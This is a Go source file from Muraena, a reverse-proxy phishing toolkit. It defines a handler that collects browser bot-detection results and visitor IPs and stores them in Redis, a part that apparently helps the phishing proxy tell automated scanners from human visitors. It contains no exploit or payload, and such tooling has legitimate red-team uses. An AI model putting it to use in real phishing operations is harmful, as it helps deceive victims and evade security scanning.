package proxy

import (
	"encoding/json"
	"fmt"
	"io/ioutil"
	"net/http"
	"time"

	"github.com/muraenateam/muraena/log"
	"github.com/muraenateam/muraena/session"
)

// BotDetectionData represents the structure of bot detection metrics
type BotDetectionData struct {
	DetectionPass map[string]string `json:"detection_pass"`
	DetectionFail map[string]string `json:"detection_fail"`
	ResultSummary ResultSummary     `json:"resultSummary"`
	IP            *string           `json:"ip"`
	Timestamp     int64             `json:"timestamp"`
	UserAgent     string            `json:"userAgent"`
	Errors        []DetectionError  `json:"errors"`
	RequestMethod string            `json:"-"`
	ServerTime    string            `json:"-"`
	RequestPath   string            `json:"-"`
	RequestQuery  string            `json:"-"`
}

// ResultSummary represents the summary of bot detection results
type ResultSummary struct {
	Checks    int     `json:"checks"`
	Score     float64 `json:"score"`
	Threshold int     `json:"threshold"`
	IsBot     bool    `json:"isBot"`
}

// DetectionError represents an error that occurred during bot detection
type DetectionError struct {
	Check     string `json:"check"`
	Message   string `json:"message"`
	Timestamp int64  `json:"timestamp"`
}

// BotHandler handles requests from same-origin JavaScript for bot detection metrics
func BotHandler(sess *session.Session) http.HandlerFunc {
	return func(w http.ResponseWriter, r *http.Request) {
		// Defer the recovery function in case of panic
		defer func() {
			if err := recover(); err != nil {
				log.Warning("Recovered from panic in BotHandler: %s", err)
				http.Error(w, "Internal Server Error", http.StatusInternalServerError)
			}
		}()

		// TODO remove this CORS * and use the Muraena phishing origin as https//phishing-origin-domain
		w.Header().Set("Access-Control-Allow-Origin", "*")
		w.Header().Set("Access-Control-Allow-Methods", "GET, POST, OPTIONS")
		w.Header().Set("Access-Control-Allow-Headers", "Content-Type")

		// Handle preflight OPTIONS request
		if r.Method == "OPTIONS" {
			w.WriteHeader(http.StatusOK)
			return
		}

		var botData BotDetectionData
		botData.RequestMethod = r.Method
		botData.ServerTime = time.Now().UTC().Format(time.RFC3339)
		botData.RequestPath = r.URL.Path
		botData.RequestQuery = r.URL.RawQuery

		switch r.Method {
		case "GET":
			// For GET requests, parse query parameters
			ipParam := r.URL.Query().Get("ip")
			if ipParam != "" {
				botData.IP = &ipParam
			}
			log.Debug("[BotHandler] GET request from IP: %s", GetSenderIP(r))

		case "POST":
			// For POST requests, parse JSON body
			body, err := ioutil.ReadAll(r.Body)
			if err != nil {
				log.Error("[BotHandler] Error reading request body: %s", err)
				http.Error(w, "Bad Request", http.StatusBadRequest)
				return
			}
			defer r.Body.Close()

			if len(body) == 0 {
				log.Error("[BotHandler] Empty request body")
				http.Error(w, "Bad Request: Empty body", http.StatusBadRequest)
				return
			}

			err = json.Unmarshal(body, &botData)
			if err != nil {
				log.Error("[BotHandler] Error parsing JSON: %s", err)
				http.Error(w, "Bad Request: Invalid JSON", http.StatusBadRequest)
				return
			}

			ipValue := "unknown"
			if botData.IP != nil {
				ipValue = *botData.IP
			}
			log.Debug("[BotHandler] POST request from IP: %s, IsBot: %v, Score: %.0f/%d",
				ipValue, botData.ResultSummary.IsBot, botData.ResultSummary.Score, botData.ResultSummary.Checks)

		default:
			http.Error(w, "Method Not Allowed", http.StatusMethodNotAllowed)
			return
		}

		// If IP is not set in the request, use the actual sender IP
		if botData.IP == nil || *botData.IP == "" {
			senderIP := GetSenderIP(r)
			botData.IP = &senderIP
		}

		// Store the bot detection data in Redis
		err := storeBotData(sess, &botData)
		if err != nil {
			log.Error("[BotHandler] Error storing bot data: %s", err)
			http.Error(w, "Internal Server Error", http.StatusInternalServerError)
			return
		}

		// Send success response
		w.Header().Set("Content-Type", "application/json")
		w.WriteHeader(http.StatusOK)
		response := map[string]string{
			"status":  "success",
			"message": "data received",
		}
		json.NewEncoder(w).Encode(response)

		ipLog := "unknown"
		if botData.IP != nil {
			ipLog = *botData.IP
		}
		log.Info("[BotHandler] Bot detection data stored for IP: %s", ipLog)
	}
}

// storeBotData stores bot detection data in Redis under the "bots" key
func storeBotData(sess *session.Session, data *BotDetectionData) error {
	if session.RedisPool == nil {
		return fmt.Errorf("Redis pool is not initialized")
	}

	rc := session.RedisPool.Get()
	defer rc.Close()

	// Create a unique key for this bot detection entry
	// Format: bots:<IP>:<timestamp>
	timestamp := time.Now().Unix()
	ipKey := "unknown"
	if data.IP != nil {
		ipKey = *data.IP
	}
	key := fmt.Sprintf("bots:%s:%d", ipKey, timestamp)

	// Serialize the bot data to JSON for storage
	jsonData, err := json.Marshal(data)
	if err != nil {
		return fmt.Errorf("error marshaling bot data: %s", err)
	}

	// Store the bot data in Redis
	_, err = rc.Do("SET", key, string(jsonData))
	if err != nil {
		return fmt.Errorf("error storing bot data in Redis: %s", err)
	}

	// Add the key to a list for easy retrieval of all bot entries
	_, err = rc.Do("RPUSH", "bots", key)
	if err != nil {
		return fmt.Errorf("error adding bot entry to list: %s", err)
	}

	// Set expiration on the individual entry (e.g., 30 days)
	_, err = rc.Do("EXPIRE", key, 30*24*60*60)
	if err != nil {
		log.Warning("[BotHandler] Failed to set expiration on bot entry: %s", err)
	}

	return nil
}
